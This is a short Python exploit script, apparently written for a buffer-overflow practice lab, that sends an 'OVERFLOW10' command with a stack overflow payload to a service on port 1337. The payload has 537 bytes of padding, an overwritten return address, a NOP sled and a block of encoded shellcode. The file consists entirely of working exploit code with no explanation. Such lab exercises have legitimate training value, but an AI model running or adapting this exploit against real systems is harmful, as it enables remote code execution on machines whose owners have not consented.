#!/usr/bin/python3
import socket
ip = "10.10.150.255"

port = 1337
timeout = 5
prefix = b"OVERFLOW10 "
offset = 537
NOP = b"\x90" * 20
returnAdd = b"\xaf\x11\x50\x62"
buf =  b""
buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xba\x76\x57\x2a\x83\xee\xfc\xe2\xf4\x46\x9e"
buf += b"\xd5\x2a\xba\x76\x37\xa3\x5f\x47\x97\x4e\x31\x26\x67"
buf += b"\xa1\xe8\x7a\xdc\x78\xae\xfd\x25\x02\xb5\xc1\x1d\x0c"
buf += b"\x8b\x89\xfb\x16\xdb\x0a\x55\x06\x9a\xb7\x98\x27\xbb"
buf += b"\xb1\xb5\xd8\xe8\x21\xdc\x78\xaa\xfd\x1d\x16\x31\x3a"
buf += b"\x46\x52\x59\x3e\x56\xfb\xeb\xfd\x0e\x0a\xbb\xa5\xdc"
buf += b"\x63\xa2\x95\x6d\x63\x31\x42\xdc\x2b\x6c\x47\xa8\x86"
buf += b"\x7b\xb9\x5a\x2b\x7d\x4e\xb7\x5f\x4c\x75\x2a\xd2\x81"
buf += b"\x0b\x73\x5f\x5e\x2e\xdc\x72\x9e\x77\x84\x4c\x31\x7a"
buf += b"\x1c\xa1\xe2\x6a\x56\xf9\x31\x72\xdc\x2b\x6a\xff\x13"
buf += b"\x0e\x9e\x2d\x0c\x4b\xe3\x2c\x06\xd5\x5a\x29\x08\x70"
buf += b"\x31\x64\xbc\xa7\xe7\x1e\x64\x18\xba\x76\x3f\x5d\xc9"
buf += b"\x44\x08\x7e\xd2\x3a\x20\x0c\xbd\x89\x82\x92\x2a\x77"
buf += b"\x57\x2a\x93\xb2\x03\x7a\xd2\x5f\xd7\x41\xba\x89\x82"
buf += b"\x7a\xea\x26\x07\x6a\xea\x36\x07\x42\x50\x79\x88\xca"
buf += b"\x45\xa3\xc0\x40\xbf\x1e\x5d\x21\x8b\x87\x3f\x28\xba"
buf += b"\x67\x0b\xa3\x5c\x1c\x47\x7c\xed\x1e\xce\x8f\xce\x17"
buf += b"\xa8\xff\x3f\xb6\x23\x26\x45\x38\x5f\x5f\x56\x1e\xa7"
buf += b"\x9f\x18\x20\xa8\xff\xd2\x15\x3a\x4e\xba\xff\xb4\x7d"
buf += b"\xed\x21\x66\xdc\xd0\x64\x0e\x7c\x58\x8b\x31\xed\xfe"
buf += b"\x52\x6b\x2b\xbb\xfb\x13\x0e\xaa\xb0\x57\x6e\xee\x26"
buf += b"\x01\x7c\xec\x30\x01\x64\xec\x20\x04\x7c\xd2\x0f\x9b"
buf += b"\x15\x3c\x89\x82\xa3\x5a\x38\x01\x6c\x45\x46\x3f\x22"
buf += b"\x3d\x6b\x37\xd5\x6f\xcd\xb7\x37\x90\x7c\x3f\x8c\x2f"
buf += b"\xcb\xca\xd5\x6f\x4a\x51\x56\xb0\xf6\xac\xca\xcf\x73"
buf += b"\xec\x6d\xa9\x04\x38\x40\xba\x25\xa8\xff"


buffer = b"A" * offset + returnAdd + NOP + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print(resp)


s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	

